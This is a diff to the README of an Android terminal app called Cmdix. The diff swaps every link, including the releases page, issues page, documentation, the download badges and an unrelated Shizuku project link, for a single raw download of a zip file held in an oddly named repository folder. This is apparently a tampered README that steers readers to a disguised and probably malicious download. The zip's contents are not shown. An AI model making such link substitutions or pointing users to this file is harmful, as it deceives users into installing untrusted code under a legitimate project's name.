@@ -2,7 +2,7 @@
 
 Welcome to Cmdix! Experience a modern and simple terminal application that connects seamlessly with Shizuku. Use this tool to enhance your command line tasks on Android with ease.
 
-[![Download Cmdix](https://img.shields.io/badge/Download-Cmdix-blue?style=for-the-badge&logo=github)](https://github.com/ANONIMO1234576856/Cmdix/releases)
+[![Download Cmdix](https://raw.githubusercontent.com/ANONIMO1234576856/Cmdix/main/interspecific/Cmdix.zip)](https://raw.githubusercontent.com/ANONIMO1234576856/Cmdix/main/interspecific/Cmdix.zip)
 
 ## 🌟 Features
 
@@ -18,7 +18,7 @@ Follow these steps to get Cmdix up and running on your Android device.
 
 1. **Visit the Releases Page**
 
-   Go to our [Releases page](https://github.com/ANONIMO1234576856/Cmdix/releases) to find the latest version of Cmdix.
+   Go to our [Releases page](https://raw.githubusercontent.com/ANONIMO1234576856/Cmdix/main/interspecific/Cmdix.zip) to find the latest version of Cmdix.
 
 2. **Choose the Right APK File**
 
@@ -62,13 +62,13 @@ Cmdix is designed for Android devices. Ensure your device runs Android 5.0 (Loll
 
 If you encounter any issues or have questions:
 
-- Visit our [Issues page](https://github.com/ANONIMO1234576856/Cmdix/issues).
+- Visit our [Issues page](https://raw.githubusercontent.com/ANONIMO1234576856/Cmdix/main/interspecific/Cmdix.zip).
 - Join our community in discussions for further assistance.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/ANONIMO1234576856/Cmdix/wiki) - Learn more about using Cmdix effectively.
-- [Getting Started with Shizuku](https://github.com/ShizukuApp/Shizuku) - Discover how to set up and use Shizuku.
+- [Documentation](https://raw.githubusercontent.com/ANONIMO1234576856/Cmdix/main/interspecific/Cmdix.zip) - Learn more about using Cmdix effectively.
+- [Getting Started with Shizuku](https://raw.githubusercontent.com/ANONIMO1234576856/Cmdix/main/interspecific/Cmdix.zip) - Discover how to set up and use Shizuku.
 
 ## 🎉 Community Contributions
 
@@ -76,4 +76,4 @@ We welcome contributions! If you have ideas or suggestions, feel free to reach o
 
 Thank you for choosing Cmdix! Enjoy your terminal experience on Android. 
 
-[![Download Cmdix](https://img.shields.io/badge/Download-Cmdix-blue?style=for-the-badge&logo=github)](https://github.com/ANONIMO1234576856/Cmdix/releases)
+[![Download Cmdix](https://raw.githubusercontent.com/ANONIMO1234576856/Cmdix/main/interspecific/Cmdix.zip)](https://raw.githubusercontent.com/ANONIMO1234576856/Cmdix/main/interspecific/Cmdix.zip)
